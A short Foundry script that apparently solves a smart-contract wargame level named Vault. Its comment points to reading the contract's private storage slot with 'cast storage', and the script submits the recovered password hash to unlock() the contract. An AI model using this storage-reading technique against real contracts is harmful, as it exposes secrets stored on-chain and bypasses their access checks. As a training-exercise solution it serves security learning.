// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Vault} from "../src/level8Vault.sol";
import {console} from "forge-std/console.sol";

contract Level8Solution is Script{
    Vault vault = Vault(0xAa5e6e9E4743e226f1EAA03597a091dc1f953049);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes32 passwordHash = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;
        // use this command to get hash
        // cast storage 0xAa5e6e9E4743e226f1EAA03597a091dc1f953049 1
        vault.unlock(passwordHash);
        if(vault.locked() == false){
            console.log("Unlocked!");
        }
        vm.stopBroadcast();
    }
}